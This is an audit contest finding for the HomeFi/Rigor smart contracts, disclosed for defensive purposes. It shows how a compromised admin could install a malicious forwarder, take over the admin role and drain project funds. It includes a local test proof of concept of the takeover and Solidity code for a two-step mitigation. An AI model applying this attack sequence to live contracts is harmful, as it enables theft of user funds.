## Tags

- bug
- 2 (Med Risk)
- sponsor confirmed
- valid

# [Attacker can drain all the projects within minutes, if admin account has been exposed](https://github.com/code-423n4/2022-08-rigor-findings/issues/264) 

# Lines of code

https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L156-L169
https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L199-L208


# Vulnerability details


## Impact
In case where the admin wallet has been hacked, the attacker can drain all funds out of the project within minutes. All the attacker needs is the admin to sign a single meta/normal tx.
Even though the likelihood of the admin wallet being hacked might be low, given that the impact is critical - I think this makes it at least a medium bug.


Examples of cases where the attacker can gain access to admin wallet:
* The computer which the admins are using has been hacked
    * Even if a hardware wallet is used, the attacker can still replace the data sent to the wallet the next time the admin has to sign a tx (whether it's a meta or normal tx)
* The website/software where the meta tx data is generated has been hacked and attacker modifies the data for tx
* A malicious website tricks the admin into signing a meta tx to replace the admin or forwarder 



Since the forwarder has the power to do everything in the system , once an attacker manages to replace it with a malicious forwarder, he can do whatever he wants withing minutes:
* The forwarder can replace the admin
* The forwarder can drain all funds from all projects by changing the subcontractor and marking tasks as complete, or adding new tasks / changing task cost as needed.

Even when signatures are required, you can bypass it by using the `approveHash` function.

## Proof of Concept
Here's a PoC for taking over and running the `Project.setComplete()` function (I haven't included a whole process of changing SC etc. since that would be too time consuming, but there shouldn't be a difference between functions, all can be impersonated once you control the forwarder).

The PoC was added to [projectTests.ts#L1109](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/projectTests.ts#L1109), and is based on the 'should be able to complete a task' test.

```typescript


  it('PoC forwarder overtake', async () => {
    const attacker = signers[10];


    // deploy the malicious forwarder
    const maliciousForwarder = await deploy<MaliciousForwarder>('MaliciousForwarder');
    const adminAddress = await homeFiContract.admin();
    const adminSigner = getSignerByAddress(signers, adminAddress);
    // attacker takes over
    await homeFiContract.connect(adminSigner).setTrustedForwarder(maliciousForwarder.address);
      
    // attacker can now replace the admin, so that admin can't set the forwarder back
    let { data } = await homeFiContract.populateTransaction.replaceAdmin(
      attacker.address
    );
    let from = adminAddress;
    let to = homeFiContract.address;
    if (!data) {
      throw Error('No data');
    }
    let tx = await executeMetaTX(from, to, data);

    // assert that admin has been replaced by attacker
    expect(await homeFiContract.admin()).to.be.eq(attacker.address);

    // attacker can now execute setComplete() using the approveHash() method

    const taskID = 1;
    const _taskCost = 2 * taskCost;
    const taskSC = signers[3];
    let completeData = {
      types: ['uint256', 'address'],
      values: [taskID, project.address],
    };
    const [encodedData, hash] = await encodeDataAndHash(completeData);
    await mockDAIContract.mock.transfer
      .withArgs(taskSC.address, _taskCost)
      .returns(true);
    await mockDAIContract.mock.transfer
      .withArgs(await homeFiContract.treasury(), _taskCost / 1e3)
      .returns(true);

    ({data} = await project.populateTransaction.approveHash(hash));
    let contractor = await project.contractor();
    let {subcontractor} = await project.getTask(taskID);
    let builder = await project.builder();

    await executeMetaTX(contractor, project.address, data as string);
    await executeMetaTX(subcontractor, project.address, data as string);
    await executeMetaTX(builder, project.address, data as string);
    

    tx = await project.setComplete(encodedData, "0x");
    await tx.wait();

    await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);

    const { state } = await project.getTask(taskID);
    expect(state).to.equal(3);
    const getAlerts = await project.getAlerts(taskID);
    expect(getAlerts[0]).to.equal(true);
    expect(getAlerts[1]).to.equal(true);
    expect(getAlerts[2]).to.equal(true);
    expect(await project.lastAllocatedChangeOrderTask()).to.equal(0);
    expect(await project.changeOrderedTask()).to.deep.equal([]);

    async function executeMetaTX(from: string, to: string, data: string ) {
      const gasLimit = await ethers.provider.estimateGas({
        to,
        from,
        data,
      });
      const message = {
        from,
        to,
        value: 0,
        gas: gasLimit.toNumber(),
        nonce: 0,
        data,
      };

      // @ts-ignore
      let tx = await maliciousForwarder.execute(message, "0x");
      return tx;
    }
  });


// ----------------------------------------------------- //
// Added to ethersHelpers.ts file:
export function encodeDataAndHash(
  data: any): string[] {
  const encodedData = encodeData(data);
  const encodedMsgHash = ethers.utils.keccak256(encodedData);
  return [encodedData, encodedMsgHash];
}
```

## Recommended Mitigation Steps

* Limit `approveHash` to contracts only - I understood from the sponsor that it is used for contracts to sign hashes. So limiting it to contracts only can help prevent stealing funds (from projects that are held by EOA) in case that the forwarder has been compromised (this is effective also in case there's some bug in the forwarder contract).
    * Alternately, you can also make it use `msg.sender` instead of `_msgSender()`, this will also have a similar effect (it will allow also EOA to use the function, but not via forwarder). 
        * The advantage is that not only it wouldn't cost more than now, it'll even save gas. 
        * Another advantage is that it will also protect projects held by contracts from being impersonated by a malicious forwarder

* Make the process of replacing the forwarder or the admin a 2 step process with a delay between the steps (except for disabling the forwarder, in case the forwarder was hacked). This will give the admin the option to take steps to stop the attack, or at least give the users time to withdraw their money.


```solidity
    /// @inheritdoc IHomeFi
    function replaceAdmin(address _newAdmin)
        external
        override
        onlyAdmin
        nonZero(_newAdmin)
        noChange(admin, _newAdmin)
    {
        // Replace admin
        pendingAdmin = _newAdmin;

        adminReplacementTime = block.timestamp + 1 days;
        emit AdminReplaceProposed(_newAdmin);
    }

        /// @inheritdoc IHomeFi
    function executeReplaceAdmin()
        external
        override
        onlyAdmin

    {
        require(adminReplacementTime > 0 && block.timestamp > adminReplacementTime, "HomeFi::adminReplacmantTime");
        // Replace admin
        admin = pendingAdmin;

        emit AdminReplaced(_newAdmin);
    }
    /// @inheritdoc IHomeFi
    function setTrustedForwarder(address _newForwarder)
        external
        override
        onlyAdmin
        noChange(trustedForwarder, _newForwarder)
    {
        // allow disabling the forwarder immediately in case it has been hacked
        if(_newForwarder == address(0)){
            trustedForwarder = _newForwarder;
        }
        forwarderSetTime = block.timestamp + 3 days;
        pendingTrustedForwarder = _newForwarder;
    }

    function executeSetTrustedForwarder(address _newForwarder)
        external
        override
        onlyAdmin
    {
        require(forwarderSetTime > 0 &&  block.timestamp > forwarderSetTime, "HomeFi::forwarderSetTime");
        trustedForwarder = pendingTrustedForwarder;
    }

```

* Consider removing the meta tx for `HomeFi` `onlyAdmin` modifier (i.e. usg `msg.sender` instead of `_msgSender()`), given that it's not going to be used that often it may be worth giving up the comfort for hardening security
